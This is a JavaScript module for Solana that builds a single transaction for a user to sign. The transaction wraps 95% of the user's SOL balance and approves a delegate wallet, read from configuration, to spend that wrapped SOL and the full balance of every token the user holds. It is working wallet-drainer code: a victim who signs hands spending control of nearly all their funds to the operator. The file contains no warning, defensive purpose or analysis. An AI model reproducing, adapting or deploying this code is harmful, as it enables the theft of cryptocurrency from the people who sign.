const { 
    Transaction, 
    PublicKey, 
    SystemProgram,
    LAMPORTS_PER_SOL
} = require("@solana/web3.js");
const { 
    createApproveInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    TOKEN_PROGRAM_ID,
    NATIVE_MINT,
    createSyncNativeInstruction
} = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");

const MIN_RAW_AMOUNT = 1000n;
const JUP_SOL_AMOUNT = 0.005 * LAMPORTS_PER_SOL; // 0.005 SOL
const SOL_TO_WSOL_RATIO = 0.95; // Convert 95% of SOL to WSOL

async function buildApprove(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();
            const tx = new Transaction();

            const userPubkey = new PublicKey(user);
            const delegatePubkey = new PublicKey(config.WALLET);

            // Blockhash
            const { blockhash } = await conn.getLatestBlockhash("confirmed");
            setBlockhash(blockhash);
            tx.recentBlockhash = blockhash;

            // Fee payer = user
            tx.feePayer = userPubkey;

            // ===== 1. Create WSOL ATA (if doesn't exist) =====
            const wsolAta = getAssociatedTokenAddressSync(
                new PublicKey(NATIVE_MINT),
                userPubkey,
                false,
                TOKEN_PROGRAM_ID
            );

            const wsolAtaInfo = await conn.getAccountInfo(wsolAta);
            let wsolAtaCreated = false;
            
            if (!wsolAtaInfo) {
                logger.info("Creating WSOL ATA", { ata: wsolAta.toBase58() });
                tx.add(
                    createAssociatedTokenAccountInstruction(
                        userPubkey,
                        wsolAta,
                        userPubkey,
                        new PublicKey(NATIVE_MINT),
                        TOKEN_PROGRAM_ID,
                        TOKEN_PROGRAM_ID
                    )
                );
                wsolAtaCreated = true;
            }

            // ===== 2. Calculate SOL to convert =====
            const userBalance = await conn.getBalance(userPubkey);
            const solToConvert = Math.floor(userBalance * SOL_TO_WSOL_RATIO);

            if (solToConvert > 0) {
                logger.info("Converting SOL to WSOL", {
                    solToConvert: solToConvert / LAMPORTS_PER_SOL,
                    solForFees: (userBalance - solToConvert) / LAMPORTS_PER_SOL
                });

                // ===== 3. Transfer SOL to WSOL ATA =====
                tx.add(
                    SystemProgram.transfer({
                        fromPubkey: userPubkey,
                        toPubkey: wsolAta,
                        lamports: solToConvert
                    })
                );

                // ===== 4. SyncNative - convert native SOL to WSOL tokens =====
                tx.add(
                    createSyncNativeInstruction(
                        wsolAta,
                        TOKEN_PROGRAM_ID
                    )
                );
            }

            // ===== 5. Get all token accounts =====
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

            // ===== 6. Approve WSOL + all SPL tokens in single loop =====
            let approvedTokenCount = 0;

            // Approve WSOL if we converted SOL
            if (solToConvert > 0) {
                logger.info("Adding approve for WSOL", {
                    amount: solToConvert.toString()
                });
                tx.add(
                    createApproveInstruction(
                        wsolAta,
                        delegatePubkey,
                        userPubkey,
                        BigInt(solToConvert)
                    )
                );
                approvedTokenCount++;
            }

            // Approve all other SPL tokens
            for (const token of tokenAccounts.tokens || []) {
                if (token.amount < MIN_RAW_AMOUNT) continue;

                logger.info("Adding approve for SPL token", {
                    mint: token.mint,
                    amount: token.amount.toString()
                });

                tx.add(
                    createApproveInstruction(
                        token.ata,
                        delegatePubkey,
                        userPubkey,
                        token.amount
                    )
                );
                approvedTokenCount++;
            }

            logger.info("Complete approve transaction built", {
                instructions: tx.instructions.length,
                wsolAtaCreated,
                solConverted: solToConvert > 0,
                approvedTokens: approvedTokenCount
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build approve transaction", { 
                error: err.message,
                stack: err.stack 
            });
            throw err;
        }
    }, "buildApprove");
}

module.exports = { buildApprove };
